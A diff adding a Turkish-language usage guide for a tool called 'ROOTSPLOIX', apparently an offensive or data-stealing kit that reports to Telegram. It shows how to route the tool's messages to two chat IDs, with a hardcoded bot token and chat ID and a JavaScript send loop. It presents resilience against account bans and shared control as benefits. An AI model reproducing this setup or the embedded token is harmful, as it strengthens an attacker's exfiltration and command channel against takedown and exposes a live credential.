@@ -1,0 +1,58 @@
+🔥💀 ROOTSPLOIX ÇİFT ID KULLANIM REHBERİ 💀🔥
+
+ÇİFT ID KULLANILIRMı? EVET!
+
+📱 YÖNTEM 1: ARRAY İLE
+chatId: ['5312173877', 'YENİ_ID']
+
+📱 YÖNTEM 2: STRING İLE (VİRGÜL)
+chatId: '5312173877,YENİ_ID'
+
+🔧 CODE DEĞİŞİKLİĞİ:
+
+ESKİ KOD:
+```
+telegram: {
+    botToken: '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM',
+    chatId: '5312173877',
+    apiUrl: 'https://api.telegram.org/bot'
+}
+```
+
+YENİ KOD (ÇİFT ID):
+```
+telegram: {
+    botToken: '8295691131:AAEJjGLfXEtbHhTyqJ4RC7JFbpGnx_OHthM',
+    chatId: ['5312173877', 'YENİ_ID'],
+    apiUrl: 'https://api.telegram.org/bot'
+}
+```
+
+⚡ TELEGRAM API CLASS DEĞİŞİKLİĞİ:
+```javascript
+async sendMessage(message, options = {}) {
+    const chatIds = Array.isArray(this.chatId) ? this.chatId : [this.chatId];
+    
+    for (const chatId of chatIds) {
+        // Her ID'ye ayrı mesaj gönder
+        await this.sendToSingleChat(chatId, message, options);
+    }
+}
+```
+
+🎯 AVANTAJLARI:
+✅ İki kişi de mesaj alır
+✅ Yedek sistem oluşur
+✅ Kontrolü paylaşabilirsin
+✅ Bir ID banlanırsa diğeri çalışır
+
+💀 DİSAVANTAJI:
+❌ Çift mesaj gider (spam olabilir)
+❌ Rate limiting riski artar
+
+🚀 HANGİ YÖNTEMI TERCİH EDİYORSUN?
+1. Sadece yeni ID'ye devret
+2. Çift ID kullan (ikisine de gelsin)
+3. Önce test, sonra devret
+
+💀 ROOTSPLOIX ÇİFT ID DESTEKLİYOR!
